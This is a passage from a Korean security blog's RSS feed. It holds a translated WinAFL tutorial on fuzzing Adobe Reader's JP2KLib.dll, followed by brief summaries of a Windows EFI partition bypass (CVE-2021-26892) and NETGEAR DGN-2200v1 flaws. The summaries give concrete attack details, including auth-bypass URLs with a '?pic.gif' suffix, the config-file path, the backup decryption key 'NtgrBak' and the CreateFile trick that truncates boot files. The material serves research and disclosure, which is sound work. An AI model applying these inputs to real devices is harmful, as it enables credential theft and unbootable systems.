a Target Function?</h1><p><a href="https://github.com/googleprojectzero/winafl#how-to-select-a-target-function">타겟함수</a>는 WinAFL이 퍼징 프로세스의 엔트리 포인트로 사용된는 함수를 뜻합니다. fuzz_iteration 횟수만큼 반복 호출되며 각 실행마다 input 파일을 뮤테이트합니다.</p><p>타겟 함수는:</p><p>input 파일을 열고, 파일을 읽고, 파일을 파싱 한 후 닫아야 합니다.</p><p>C++ exception 혹은 TermainateProcess를 호출하지 않고 정상적으로 리턴해야 합니다.</p><p>이런 함수를 찾기란 쉽지 않고 따라서 복잡한 소프트웨어가 타겟일 땐 대개 harness를 작성해야 합니다.</p><h1 id="What-is-a-Harness"><a href="#What-is-a-Harness" class="headerlink" title="What is a Harness?"></a>What is a Harness?</h1><p>Harness는 퍼징 하려는 함수를 트리거하는 작은 프로그램입니다. Harness는 타겟 함수를 포함하고 있어야 합니다. 다음은 WinAFL 레포에 포함된 gdiplus에 대한 간단한 예제 harness입니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/4.png"></p><p>main의 첫 argument는 경로입니다. 함수 내에서 퍼징 하려는 API인 Image::Image parser를 다음과 같이 호출합니다. 오류 발생 시 프로세스를 종료하지 않고 마지막에 모든 리소스를 해제합니다.</p><p>이 프로세스는 문서화된 API에서 비교적 쉽습니다. 문서를 사용해 샘플 코드를 복사하거나 간단한 프로그램을 작성할 수 있습니다. 하지만 그러면 너무 쉽죠?</p><p>Closed Source 바이너리인 Adobe Reader를 타겟으로 선택했습니다. 이런 타겟의 Harness 작성법은 다음과 같습니다.</p><ol><li>퍼징 할만한 함수를 찾습니다.</li><li>리버싱을 통해 분석합니다.</li><li>해당 API를 호출하는 프로그램을 작성합니다.</li><li>잘 작동하는 Harness를 만들 때까지 반복합니다.</li></ol><p>다음 섹션에서는 JP2KLib.dll을 리버싱 하고 작동하는 하니스를 작성하는 방법을 자세히 설명합니다. 간략한 방법론에만 관심이 있는 독자들은 다음 섹션으로 건너뛰시길 바랍니다.</p><h1 id="Writing-a-Harness-for-JP2KLib-dll"><a href="#Writing-a-Harness-for-JP2KLib-dll" class="headerlink" title="Writing a Harness for JP2KLib.dll"></a>Writing a Harness for JP2KLib.dll</h1><p>JP2KLib.dll의 리버싱을 시작하기 전에, 먼저 해당 라이브러리가 오픈소스인지 혹은 public 심볼을 갖는지 확인해야합니다. 많은 시간을 절약할 수 있고 생각보다 흔한 일이지만 저희의 경우에는 운이 별로 좋지 않았습니다.</p><p>저희는 Adobe Reader가 JP2KLib를 사용하는 방식과 최대한 유사한 Harness를 작성하고 싶기 때문에 먼저 적절한 PDF파일을 찾아야 했습니다.</p><p>저희는 제품 테스트용 PDF corpus를 많이 가지고 있습니다. 그중 JPEG2000용 PDF 필터인 “/JPXdecode”에 해당하는 가장 간단한 예제를 사용했습니다. 구글링 또는 Abrocat Pro/Phantom PDF를 사용해 testcase를 생성할 수도 있습니다.</p><p>Pro Tip 1: reader에 샌드박스가 있어 debugging/triaging에 성가신 경우가 있으므로 이 기능을 사용하지 않도록 설절할 수 있습니다.</p><p><a href="https://forums.adobe.com/thread/2110951">https://forums.adobe.com/thread/2110951</a></p><p>Pro Tip 2: <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-and-pageheap">PageHeap</a>을 설정하여 할당 위치와 크기를 추적하는 것으로 리버싱 작업을 수월하게 만들 수 있습니다.</p><p>PDF wrapper 없이도 harness에 사용할 수 있도록 샘플 중에서 추출하여 jp2 파일을 추출했습니다. 나중에 harness의 test input으로 사용할 것들입니다.</p><p>작동하는 최소 샘플을 얻었으니 “sxe ld jp2klib”을 사용해 JP2KLib.dll이 로드되는 시점에 브레이크 포인트를 걸어줍니다. 브레이크 포인트가 걸리면 JP2KLib의 모든 export 함수에 브레이크 포인트를 걸어 줍니다. 브레이크 포인트 명령어는 모든 call stack, 인자, 리턴 값을 기록합니다.</p><pre><code class="hljs bash">bm /a jp2klib!* “.<span class="hljs-built_in">echo</span> callstack; k L5; .<span class="hljs-built_in">echo</span> parameters:;  dc esp L8;  .<span class="hljs-built_in">echo</span> <span class="hljs-built_in">return</span> value: ; pt; ”</code></pre><p>샘플 PDF를 로드해 다음과 같은 output을 얻었습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/5.png"></p><p>JP2KLib가 로드된 후 첫 번째로 호출되는 함수는 JP2KLibInitEx입니다. JP2KLibInitEx가 받는 인자를 분석해 봅시다.</p><p><img src="/2021/07/04/fabu1ous/50cve/6.png"></p><p>AcrobRd32.dll의 함수를 가리키는 포인트가 담긴 0x20 크기의 구조체를 인자로 받습니다. 새로운 함수에 도달했다고 바로 분석하려들면 안됩니다. 그 함수가 타겟 코드에서 쓰일지 모르기 때문입니다. 우선 “nopX”(X는 숫자)라는 이름으로 빈 함수 포인터를 구조체에 넣어놓고 Harness의 뼈대를 만들어 봅시다.</p><ol><li>Command line argument로부터 input file을 받는다.</li><li>JP2KLib.dll을 로드한다.</li><li>만들어둔 구조체를 인자로 JP2KLibInitEx를 호출합니다.</li></ol><p><img src="/2021/07/04/fabu1ous/50cve/7.png"></p><p>LOAD_FUNC는 저희가 작성한 매크로입니다. nopX 함수를 설정하는 NOP매크로도 있습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/8.png"></p><p>컴파일하고 sample.jp2와 함께 실행해보면 잘 작동합니다.</p><p>“g”명령어를 통해 다음 함수로 넘어가 봅시다. 다음으로 실행되는 함수는 JP2KGetMemObjEx이고 어떠한 인자도 받지 않습니다. 따라서 호출하고 리턴 값만 저장합시다.</p><p>그다음 함수인 JP2KDecOptCreat 또한 인자를 받지 않습니다. 마찬가지로 호출하고 리턴 값만 저장합니다. 여기서 문제가 발생합니다. JP2KDecOptCreat 내부에서 nop4와 nop7 함수를 호출하는군요. 따라서 각각 구현을 해줘야 합니다.</p><p>이제 nop4가 어떤 동작을 하는지 알아내야 합니다. nop4에 해당하는 실제 함수 AcroRd32!CTJPEGDecoderRelease+0xa992 에 브레이크 포인트를 걸어줍니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/9.png"></p><p>그리고 계속 실행하다보면</p><p><img src="/2021/07/04/fabu1ous/50cve/10.png"></p><p>이곳에 도달합니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/11.png"></p><p>즉, nop4는 malloc의 wrapper함수입니다. 저희가 직접 구현한 뒤 nop4와 바꿔줍니다. nop7(memset), nop5(free), nop6(memcpy)에 대해서도 동일한 작업을 해줍니다.</p><p>그다음 함수인 JP2KDecOptInitToDefaults 인자를 받지 않습니다. 호출하고 리턴 값을 저장합니다.</p><p>현재 harness의 모습은 다음과 같습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/12.png"></p><p>다음 함수인 JP2KImageInitDecoderEx는 5개의 인자를 받습니다!</p><p>5개의 인자 중 3개는 JP2KImageCreate, JP2KDecOptCreate, JP2KGetMemObjEx의 리턴 값입니다.</p><p>세 번째 인자는 vtable을 가리키는 포인터입니다. 지금까지 사용한 트릭을 똑같이 반복합니다. nop을 담고 있는 구조체를 인자로 함수를 호출합니다.</p><p>두 번째 인자는 구조체입니다. 함수 포인터를 담고 있지 않기 때문에 상수값 0xbaaddaab를 보내줍니다.</p><p>현재 harness의 모습은 다음과 같습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/13.png"></p><p>harness를 실행해보니 nop10으로 도달했습니다. nop10의 실제 함수에 브레이크 포인트를 걸면 다음과 같은 call stack을 얻을 수 있습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/14.png"></p><p>JP2KCodeStm::IsSeekable를 IDA로 살펴봅시다.</p><p><img src="/2021/07/04/fabu1ous/50cve/15.png"></p><p>JP2KCodeStm의 0x24 오프셋에 이전 단계에 넣어준 vtable이, 0x18 오프셋에 0xbaaddaab 상수값이 있는 것을 Windbg로 확인할 수 있습니다. JP2KCodeStm::IsSeekable은 0xbaaddaab를 인자로 vtable에 있는 함수를 호출합니다.</p><p>각 파서마다 다르겠지만 일반적으로 익숙한 파일 인터페이스(FILE/ifstream)에 존재하는 input stream을 사용합니다. 일종의 input stream(network/file/memory) 추상화입니다. 저희는 JP2KCodeStm의 동작을 보고 바로 알아차렸습니다.</p><p>0xbaaddaab는 스트림 오브젝트이고 vtable은 그 스트림 오브젝트에 대한 함수들입니다. IDA로 돌아가 JP2KCodeStm::XXX 함수들을 확인해 봅시다.</p><p><img src="/2021/07/04/fabu1ous/50cve/16.png"></p><p>대부분 유사한 방식을 사용하기 때문에 직접 파일 오브젝트를 만들고 필요한 메소드를 구현해봤습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/17.png"></p><p>오류가 나면 버리고 아니라면 JP2KImageInitDecoderEx의 리턴 값을 검사하도록 만들었습니다. JP2KImageInitDecoderEx은 성공 시 0을 리턴합니다. 스트림 함수를 구현하는데 몇 번의 시행착오가 있었지만 원하던 리턴 값을 얻는 데 성공했습니다.</p><p>다음 함수인 JP2KImageDataCreate는 인자를 받지 않으며 리턴 값을 그다음 함수인 JP2KImageGetMaxRes에 전달합니다. 호출하고 넘어갑니다.</p><p>다음은 7개의 인자를 받는 JP2KImageDecodeTileInterleaved 함수입니다. 7개의 인자 중 3개는 JP2KImageCreate, JP2KImageGetMaxRes, JP2KImageDataCreate의 리턴 값입니다.</p><p>IDA로 확인해본 결과 두 번째 그리고 6번째 인자는 NULL입니다.</p><p>네 번째, 다섯 번째 인자는 color depth와 관련된 인자로 저희는 이 두 값이 고정된 체로 퍼징을 하기로 결정했습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/18.png"></p><p>최종적으로 JP2KImageDataDestroy, JP2KImageDestroy, JP2KDecOptDestroy 함수들을 호출해 저희가 만든 오프젝트들을 해제해 memory leak을 방지합니다. 이 작업은 WinAFL로 fuzz_iterations가 높은 작업을 할 때 중요합니다.</p><p>자 이제 잘 작동하는 Harness를 완성했습니다!</p><p>아주 사소한 수정을 해줍니다. JP2KLib을 로드하고 필요한 함수를 받아오는 초기화 작업을 분리합니다. 매 실행마다 초기화 작업을 다시 해 줄 필요가 없으니 이를 분리해줌으로써 실행 속도를 향상할 수 있습니다. 새로운 함수에 fuzzme라는 이름을 지어주고 export 해줍니다. 유효한 오프셋을 구하는 것보다 export 하는 것이 훨씬 쉽습니다.</p><h1 id="Fuzzing-Methodology"><a href="#Fuzzing-Methodology" class="headerlink" title="Fuzzing Methodology"></a>Fuzzing Methodology</h1><ol><li>Basic tests for the harness<ol><li>Stability</li><li>Paths</li><li>Timeouts</li></ol></li><li>Fuzzing Setup</li><li>Initial corpus</li><li>Initial line coverage</li><li>Fuzzing loop<ol><li>Fuzz</li><li>Check coverage / crashes</li><li>cmin &amp; repeat</li></ol></li><li>Triage</li></ol><h1 id="Basic-Tests-for-the-Harness"><a href="#Basic-Tests-for-the-Harness" class="headerlink" title="Basic Tests for the Harness"></a>Basic Tests for the Harness</h1><p>퍼징을 시작하기 앞서 몇 가지 sanity test를 해야 합니다. 그저 서버실 온도만 높이는 일이 발생할 수 있으니. 첫 번째로 확인해야 할 것은 퍼저가 새로운 실행 path에 도달하는가입니다. 즉, total path count가 꾸준히 상승하는지 확인해야 합니다.</p><p>만약 path count가 0이거나 거의 0이라면 다음과 같은 함정들을 조사해봐야 합니다.</p><ul><li>컴파일러에 의해 타겟함수가 인라인 처리되어 WinAFL이 도달하지 못한다.</li><li>인자 개수나 함수 호출 규약이 잘못됐다.</li><li>타임아웃이 너무 낮아 harness가 너무 일찍 종료된다.</li></ul><p>퍼저를 몇 분 정도 실행한 뒤 안정성을 확인했습니다. 안정성이 낮아(80% 미만) 이슈를 디버깅해봤습니다. Harness의 안정성은 퍼저의 성능과 직결되기 때문에 매우 중요합니다.</p><p>흔히 빠지는 함정들</p><ul><li>난수 element들을 확인해봐야 합니다. 예를 들어 몇몇 hash table들은 collision을 방지하기 위해 난수를 사용합니다. 이는 coverage의 정확도를 떨어뜨리는 작업이므로 난수의 seed를 상수값으로 고정시키는 패치를 해줍니다.</li><li>몇몇 소프트웨어는 특정 global object에 대한 cach를 사용합니다. nop run을 통해 이를 방지합니다.</li><li>Windows 10 64-bit 시스템에서 돌아가는 32-bit 타겟의 stack alignment는 항상 8이 아닙니다. 이는 memcpy를 포함한 다른 AVX 최적화 코드들의 동작에 영향을 주며 coverage 또한 영향을 받습니다. harness에 stack aligne을 맞추는 코드를 추가하는 방법으로 해결할 수 있습니다.</li></ul><p>만약 위 방법이 모두 실패한다면 DynamoRIO를 사용해 harness의 인스트럭션을 추적하고 output을 비교합니다.</p><h1 id="Fuzzing-Setup"><a href="#Fuzzing-Setup" class="headerlink" title="Fuzzing Setup"></a>Fuzzing Setup</h1><p>저희는 다음 과 같은 VM을 사용합니다.</p><p>8~16 core, 32 GB of RAM, Windows 10 x64</p><p>저희는 <a href="https://sourceforge.net/projects/imdisk-toolkit/">ImDisk toolkit</a>을 사용해 RAM disk drive를 사용합니다. 빠른 타겟을 대상으로 디스크에 test case를 작성하는 것은 병목 현상을 유발하기 때문입니다.</p><p>Windows Defender 또한 성능에 악영향을 끼치니 비활성화해줍니다. WinAFL이 생성하는 test case들 중 Windows Defender에서 알려진 exploit으로 처리하는 경우도 있습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/19.png"></p><p>Windows Indexing Service도 비활성화해줍니다.</p><p>퍼징 도중 시스템을 재시작하거나 퍼징 하던 dll을 대체하는 등의 문제가 발생할 수 있으니 Windows Update도 비활성화해줍니다.</p><p>버그 탐색에 도움이 되므로 harness 프로세스에 대한 page heap은 활성화해줍니다.</p><p>속도는 느리지만 버그 탐색에 효과적이라는 edge coverage type을 사용했습니다.</p><p>퍼징을 시작하는 명령어는 다음과 같습니다.</p><pre><code class="hljs bash">afl-fuzz.exe -i R:\\jp2k\\<span class="hljs-keyword">in</span> -o R:\\jp2k\\out -t 20000+ -D c:\\DynamoRIO-Windows-7.0.0-RC1\\bin32 -S Slav02 — -fuzz_iterations 10000 -coverage_module JP2KLib.dll -target_module adobe_jp2k.exe -target_method fuzzme -nargs 1 -covtype edge — adobe_jp2k.exe @@</code></pre><h1 id="Initial-Corpus"><a href="#Initial-Corpus" class="headerlink" title="Initial Corpus"></a>Initial Corpus</h1><p>Harness를 완성했다면 아래 방법들로 초기 corpus를 확보해야 합니다.</p><ul><li>Online corpuses ( <a href="https://lcamtuf.coredump.cx/afl/demo/">afl corpus</a>, <a href="https://github.com/uclouvain/openjpeg-data">openjpeg-data</a> )</li><li>Test suites from open source projects</li><li>Crawlling google / duckduckgo</li><li>Corpuses from our older fuzzing projects</li></ul><h1 id="Corpus-Minimization"><a href="#Corpus-Minimization" class="headerlink" title="Corpus Minimization"></a>Corpus Minimization</h1><p>동일한 coverage를 생성하는 용량이 큰 파일을 사용하면 퍼저의 성능이 저하됩니다. AFL은 이를 해결하기 위해 afl-cmin을 사용해 corpus를 간소화 시킵니다. WinAFL은 winafl-cmin.py라는 툴을 제공합니다.</p><p>확보한 모든 파일을 winafl-cmin.py에 넣고 간소화된 corpus를 얻을 수 있습니다.</p><p>같은 파일에 대해 winafl-cmin을 두 번 돌려보고 같은 결과가 나오는지 비교해봐야 합니다. 만약 두 결과가 다르다면 harness가 비결정론 문제를 안고 있다고 볼 수 있습니다.</p><h1 id="Initial-Line-Coverage"><a href="#Initial-Line-Coverage" class="headerlink" title="Initial Line Coverage"></a>Initial Line Coverage</h1><p>Corpus를 얻었으니 이젠 line coverage를 살펴볼 차례입니다. Line coverage란 실제로 실행된 어셈블리 인스트럭션을 뜻합니다. DynamoRIO를 사용해 line coverage를 얻을 수 있습니다.</p><pre><code class="hljs bash">[dynamoriodir]\\bin32\\drrun.exe -t drcov — harness.exe testcase</code></pre><p>각 test case에 대해 위 명령어를 실행하고 결과값을 IDA <a href="https://github.com/gaasedelen/lighthouse">Lighthouse</a>로 확인합니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/20.png">는데 도움이 됩니다.</p><h1 id="Fuzzing-Cycle"><a href="#Fuzzing-Cycle" class="headerlink" title="Fuzzing Cycle"></a>Fuzzing Cycle</h1><p>다음 단계는 매우 간단합니다.</p><ol><li>퍼저를 실행한다.</li><li>Coverage와 Crash 분석</li><li>Coverage 조사, cmin 그리고 반복</li></ol><p>퍼저를 돌리는 것은 특별히 어려운 일이 아닙니다. 위에서 설명한 구성대로 퍼저를 실행하기만 하면 됩니다.</p><p>저희는 다음과 같은 기능의 봇을 사용합니다.</p><ol><li>모든 퍼저의 상태(<a href="http://winafl-whatsapp.py/">winafl-whatsapp.py</a>)</li><li>각 퍼저의 시간에 따른 path 변화 그래프</li><li>Crash triage (다음 섹션에서 다룸)</li><li>멈춘 퍼저 재시작</li></ol><p>위 작업들을 자동화하는 것이 얼마나 중요한지 굳이 설명할 필요는 없겠죠? 퍼징은 지루하고 오류가 넘치는 작업입니다.</p><p>퍼저의 상태와 path를 몇 시간 주기로 확인하고 그래프에 상승세가 보인다면 coverage를 조사합니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/21.png"></p><p>모든 퍼저의 모든 queue를 모아 cmin을 거치고 그 결과를 IDA로 확인합니다. 상대적으로 coverage가 작으면서 크기가 큰 함수를 찾습니다. 각 함수의 기능을 이해하려 노력하고 각 샘플이 어떤 기능을 트리거하는지 확인합니다.</p><p>이번 단계는 매우 중요합니다. 하나의 샘플을 추가하고 몇 시간의 퍼징을 통해 새로운 취약점 3개를 찾았습니다.</p><p>Coverage가 더 이상 늘어나지 않을 때까지 이 사이클을 반복했습니다. Coverage가 늘어나지 않는다는 뜻은 타겟을 변경하거나 harness를 개선해야 한다는 뜻입니다.</p><h1 id="Triage"><a href="#Triage" class="headerlink" title="Triage"></a>Triage</h1><p>Crash를 발생시키는 test case를 얻으면 직접 crash와 그 입력값을 분석했습니다. 하지만 중복된 결과가 많아 빠르게 전략을 바꿨습니다. <a href="https://github.com/SkyLined/BugId">Bugld</a>를 사용해 중복된 결과를 생략하고 unique crash에 대한 minimize 작업을 자동화했습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/22.png"></p><h1 id="What-We-Found"><a href="#What-We-Found" class="headerlink" title="What We Found"></a>What We Found</h1><p>이런 전략을 통해 Adobe Reader와 Adobe Pro에서 53개의 critical 한 버그를 발견할 수 있었습니다.</p><p>저희는 다른 이미지 파서 스트림 디코더 등에 이러한 프로세스를 적용해봤고 아래와 같은 CVE들을 얻을 수 있었습니다.</p><p>CVE-2018-4985, CVE-2018-5063, CVE-2018-5064, CVE-2018-5065, CVE-2018-5068, CVE-2018-5069, CVE-2018-5070, CVE-2018-12754, CVE-2018-12755, CVE-2018-12764, CVE-2018-12765, CVE-2018-12766, CVE-2018-12767, CVE-2018-12768, CVE-2018-12848, CVE-2018-12849, CVE-2018-12850, CVE-2018-12840, CVE-2018-15956, CVE-2018-15955, CVE-2018-15954,CVE-2018-15953, CVE-2018-15952, CVE-2018-15938, CVE-2018-15937, CVE-2018-15936, CVE-2018-15935, CVE-2018-15934, CVE-2018-15933, CVE-2018-15932 , CVE-2018-15931, CVE-2018-15930 , CVE-2018-15929, CVE-2018-15928, CVE-2018-15927, CVE-2018-12875, CVE-2018-12874 , CVE-2018-12873, CVE-2018-12872,CVE-2018-12871, CVE-2018-12870, CVE-2018-12869, CVE-2018-12867 , CVE-2018-12866, CVE-2018-12865 , CVE-2018-12864 , CVE-2018-12863, CVE-2018-12862, CVE-2018-12861, CVE-2018-12860, CVE-2018-12859, CVE-2018-12857, CVE-2018-12839, CVE-2018-8464</p><p>jp2k에서 발견한 취약점 중 하나는 <a href="https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/">실제 공격</a>에 악용되고 있는 것으로 확인되어 발견하고 얼마 지나지 않아 Adobe에 제보했습니다.</p><p>물론 Adobe Reader의 샌드박스와 Reader Protected Mode는 exploit의 복잡도를 크게 증가시켰습니다. 위에서 언급한 공격 사례처럼 샌드 박스로부터 시스템에 영향을 미치기 위해선 또 다른 PE exploit을 요구합니다.</p><p>저희는 WinAFL을 사랑하고 더 많이 쓰이길 바라고 있습니다.</p><p>WinAFL을 사용하면서 버그나 기능 누락 등을 자주 마주쳤습니다. Windows 10 Appifier에 대한 지원 추가, CPU 선호도, 버그 수정 및 몇 가지 GUI 기능을 추가하고 업스트림 했습니다.</p><p>저희 커밋 링크입니다.</p><p>Netanel’s commits – <a href="https://github.com/googleprojectzero/winafl/commits?author=netanel01">https://github.com/googleprojectzero/winafl/commits?author=netanel01</a></p><p>Yoava’s commits – <a href="https://github.com/googleprojectzero/winafl/commits?author=yoava333">https://github.com/googleprojectzero/winafl/commits?author=yoava333</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/winafl/">winafl</category>
      
      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://hackyboiz.github.io/tags/harness/">harness</category>
      
      <category domain="https://hackyboiz.github.io/tags/bug-bounty/">bug bounty</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/04/fabu1ous/50cve/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-26892: AN AUTHORIZATION BYPASS ON THE MICROSOFT WINDOWS EFI SYSTEM PARTITION</title>
      <link>https://hackyboiz.github.io/2021/07/03/fabu1ous/2021-07-02/</link>
      <guid>https://hackyboiz.github.io/2021/07/03/fabu1ous/2021-07-02/</guid>
      <pubDate>Sat, 03 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/6/30/cve-2021</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/30/cve-2021-26892-an-authorization-bypass-on-the-microsoft-windows-efi-system-partition">AN AUTHORIZATION BYPASS ON THE MICROSOFT WINDOWS EFI SYSTEM PARTITION</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows Extensible Firmware Interface</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Extensible Firmware Interface의 보안 기능을 우회하는 방법이 발견됐습니다. UEFI는 BIOS를 대체하는 펌웨어 규격으로 부팅 시 프로세서가 실행하는 첫 인스트럭션을 담고 있습니다. UEFI는 EFI System Partiton(이하 ESP)를 포함한 boot device를 탐색하는 작업을 합니다. ESP는 FAT 파일 시스템 포맷을 따르며 OS를 실행하기 위해 펌웨어가 파싱하는 <code>.EFI</code>파일(부트로더라고도 불림)을 담고 있습니다. FAT 파일 시스템은 ACL이나 보안 정책을 파일에 기록하지 않기 때문에 Windows에 마운트 되면 누구나 그 안에 있는 모든 파일에 읽기 또는 쓰기 작업을 할 수 있습니다. 부팅에 필요한 critical 파일을 누구나 접근할 수 있다면 악성코드를 담은 bootkit으로 대체되는 등의 문제가 발생할 수 있습니다. 따라서 Windows는 부팅이 완료된 이후에 ESP가 마운트 되는 것을 제한하고, 만약 마운트 됐다 하더라도 관리자 권한이 없다면 해당 볼륨에 어떠한 작업도 허용하지 않습니다.</p><p>하지만 <code>CreateFile</code> API와 ESP 볼륨 이름을 포함한 절대 경로를 통해 관리자 권한 없이 ESP 내부에 존재하는 임의의 <code>.EFI</code> 파일 핸들을 얻어 해당 파일의 내용을 백지화할 수 있습니다. 이미 존재하는 파일에 대해 <code>dwDesiredAccess</code> 값이 없고 <code>dwCreateDisposition</code> 에 <code>CREATE_ALWAYS</code>  플래그를 사용한 <code>CreateFile</code> 요청은 대상 파일의 크기를 0으로 축소합니다. 이를 악용해 관리자 권한이 없는 사용자라도 critical한 <code>.EFI</code> 파일의 내용을 지워버릴 수 있고 해당 시스템이 부팅하지 못하도록 만들 수 있습니다.</p><pre><code class="hljs c"><span class="hljs-function">HANDLE <span class="hljs-title">CreateFileA</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  LPCSTR                lpFileName,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwDesiredAccess,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwShareMode,</span></span><span class="hljs-function"><span class="hljs-params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwCreationDisposition,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwFlagsAndAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  HANDLE                hTemplateFile</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/auth-bypass/">auth bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/efi/">efi</category>
      
      <category domain="https://hackyboiz.github.io/tags/boot/">boot</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/03/fabu1ous/2021-07-02/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] NETGEAR firmware 취약점</title>
      <link>https://hackyboiz.github.io/2021/07/02/idioth/2021-07-02/</link>
      <guid>https://hackyboiz.github.io/2021/07/02/idioth/2021-07-02/</guid>
      <pubDate>Fri, 02 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.microsoft.com/security/blog/2021/06/30/micros</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.microsoft.com/security/blog/2021/06/30/microsoft-finds-new-netgear-firmware-vulnerabilities-that-could-lead-to-identity-theft-and-full-system-compromise/">Microsoft finds new NETGEAR firmware vulnerabilities that could lead to identity theft and full system compromise</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NETGEAR DGN-2200v1 시리즈</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>마이크로소프트에서 NETGEAR DGN-2200v1 시리즈 라우터에서 네트워크 보안을 손상시킬 수 있는 세 가지 취약점을 발견하였습니다.</p><p><strong>인증 우회를 통한 라우터 관리자 페이지 접근</strong></p><p>HTTPd 내부 처리 코드에서 <code>strstr</code>을 사용하여 전체 문자열에서 <code>.jpg</code>, <code>.gif</code>, <code>ess_</code> 등의 문자열이 마지막에 존재하는지 확인합니다. 따라서 GET 파라미터를 통해 인증이 필요한 페이지 뒤에 해당 필터링이 걸린 문자를 넣으면 인증을 우회하고 페이지에 접근이 가능합니다.</p><pre><code class="hljs asciidoc">예시) <span class="hljs-link">http://127</span>[<span class="hljs-string">.</span>]<span class="hljs-link">0[.]0</span>[<span class="hljs-string">.</span>]<span class="hljs-link">1/admin.htm?pic.gif</span></code></pre><p><strong>Cryptographic side-channel을 통해 저장된 라우터 자격 증명 가져오기</strong></p><p>라우터에서 HTTPd 페이지에 인증해야하는 경우 HTTP basic authentication이 필요합니다. 사용자 이름과 비밀번호는 base64로 인코딩되고 HTTP 헤더로 전송된 후 라우터의 메모리에 저장된 이름과 비밀번호와 비교해 확인합니다. 라우터는 파일 시스템 외부에 있는 NVRAM에 인증 정보를 저장하므로 이를 추출할 수 있습니다.</p><p>하지만 인증 부분에서 이름과 비밀번호를 <code>strcmp</code>를 사용하여 비교합니다. <code>strcmp</code>는 NUL을 만나거나 일치하지 않는 부분이 생길 때까지 문자열을 비교하므로 실패할 때까지 걸리는 시간을 통해 side-channel attack이 가능합니다.</p><p><strong>저장된 민감한 정보 탐색</strong></p><p>위에서 설명드린 인증 우회 취약점으로 인증이 필요한 페이지에 접근하는 것 뿐만 아니라 라우터의 설정 백업/복구 기능을 사용하여 사용자 이름, 비밀번호를 가져올 수 있습니다. <code>http://router_addr:8080/NETGEAR_DGN2200[.]cfg?pic[.]gif</code>로 접근하면 설정 파일을 얻을 수 있습니다. 해당 파일은 DES로 암호화 되어있으며, 백업/복구 기능의 코드에서 <code>NtgrBak</code> 키를 통해 암호화 됩니다. 이를 통해 해커는 NVRAM에 저장된 암호를 얻을 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/side-channel-attack/">side-channel attack</category>
      
      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/netgear/">netgear</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/02/idioth/2021-07-02/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-1675: Windows Spooler Service 원격 코드 실행 취약점</title>
      <link>https://hackyboiz.github.io/2021/07/01/l0ch/2021-07-01/</link>
